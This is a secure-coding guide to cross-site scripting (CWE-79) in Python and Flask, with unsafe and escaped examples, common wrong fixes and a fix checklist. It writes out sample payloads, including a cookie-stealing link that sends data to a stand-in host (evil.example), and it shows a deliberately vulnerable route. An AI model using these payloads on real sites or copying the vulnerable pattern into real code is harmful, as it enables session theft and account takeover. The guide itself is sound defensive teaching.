# CWE-79: Cross-Site Scripting (XSS)

## What it is

Cross-site scripting (CWE-79, XSS) happens when a web application puts untrusted text into an HTML page without escaping it, so the browser treats that text as markup or script. In Python web code XSS usually comes from building HTML with f-strings or `+` and returning it from a Flask route or an `http.server` handler, from `render_template_string` with user input inside the template text, from marking user data as safe with `Markup(...)` or the `|safe` filter, or from a Jinja2 `Environment` created with `autoescape=False`. Stored XSS saves the payload (a comment, chat message or profile bio) and shows it to every visitor; reflected XSS sends it straight back from a URL parameter.

## How attackers exploit it

An attacker exploits cross-site scripting by getting their HTML or JavaScript rendered in another user's browser under the vulnerable site's origin. A search page that echoes `q` is attacked with a link like `/search?q=<script>fetch('//evil.example/?c='+document.cookie)</script>`. Payloads such as `<img src=x onerror=alert(1)>` work even where `<script>` is filtered, and `" onmouseover="alert(1)` breaks out of an HTML attribute. The script runs with the victim's session, so it can steal cookies that lack `HttpOnly`, read private pages, submit forms as the victim, change their email or password, or show a fake login form. Stored XSS in a forum post, chat message or student profile hits every user who views it, including administrators.

## How to fix it in Python

To fix cross-site scripting, escape untrusted data for HTML at the point where it is inserted into the page:

- Flask: prefer `render_template("page.html", name=name)`. Flask autoescapes `.html` templates, so `{{ name }}` is safe.
- If a route builds HTML strings, wrap every untrusted value in `escape(...)` from `markupsafe` (MarkupSafe ships with Flask).
- Plain functions and `http.server` handlers: use `html.escape(value)` from the standard library. It escapes `& < > " '`, so it is also safe inside quoted attribute values.
- `render_template_string`: the template must be a fixed literal; pass user data as variables, e.g. `render_template_string("<p>{{ q }}</p>", q=q)`.
- Jinja2 `Environment`: use `autoescape=select_autoescape()` or `autoescape=True`.
- Remove `Markup(user_value)` and `|safe` on user data.
- User-supplied URLs in `href` or `src` also need a scheme check (`http`/`https` only), because escaping does not block `javascript:`.

## Unsafe example

This cross-site scripting example returns user input inside an HTML string from a Flask route:

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/search")
def search():
    q = request.args.get("q", "")
    return f"<h2>Results for {q}</h2><p>No posts found.</p>"

# /search?q=<script>alert(document.cookie)</script> runs the script
```

The f-string copies `q` into the page unchanged, so any tags or event handlers in it are parsed and run by the browser. The same XSS flaw appears with `render_template_string(f"... {q} ...")`, where the input becomes part of the template source itself and also allows server-side template injection.

## Safe example

The cross-site scripting fix escapes the value before it goes into the HTML, keeping the same route and output for normal input:

```python
from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)

@app.route("/search")
def search():
    q = request.args.get("q", "")
    return f"<h2>Results for {escape(q)}</h2><p>No posts found.</p>"
```

`escape` turns `<` into `&lt;`, `"` into `&#34;` and so on, so the browser displays the text instead of running it. Outside Flask, `html.escape(q)` from the standard library does the same job. For a page with more markup, moving the HTML into a template and calling `render_template("search.html", q=q)` escapes every variable automatically.

## Common wrong fixes

These changes look like cross-site scripting fixes but stay exploitable:

- Removing `<script>` with `replace` or a regex. `onerror=` handlers, `<svg>`, `javascript:` URLs and mixed case still work.
- Blacklisting characters or words instead of escaping on output.
- Escaping `<` and `>` by hand but not quotes, so attribute values can still be broken out of.
- Escaping one value but wrapping user input in `Markup()` elsewhere, or adding `|safe` in the template.
- Moving the f-string into `render_template_string(f"...")`; the input still controls the template.
- Turning off autoescaping because the output "looked double-escaped".
- Adding `# nosec`, wrapping the route in try/except, or removing the page.

## Checklist for a correct fix

Before accepting a cross-site scripting fix, confirm:

- Every untrusted value inserted into HTML goes through `markupsafe.escape`, `html.escape`, or an autoescaping template.
- Stored data (names, comments, messages) is escaped too, not only request parameters.
- `render_template_string`, if still used, receives a fixed template string with user data passed as variables.
- No `Markup(...)`, `|safe` or `autoescape=False` is applied to user data.
- Attribute values are quoted and escaped; user URLs are limited to `http`/`https`.
- The function keeps its name, parameters, route and normal output, so ordinary text displays exactly as before.
- Only installed imports are added (`markupsafe`, which ships with Flask, or stdlib `html`); no `# nosec`.
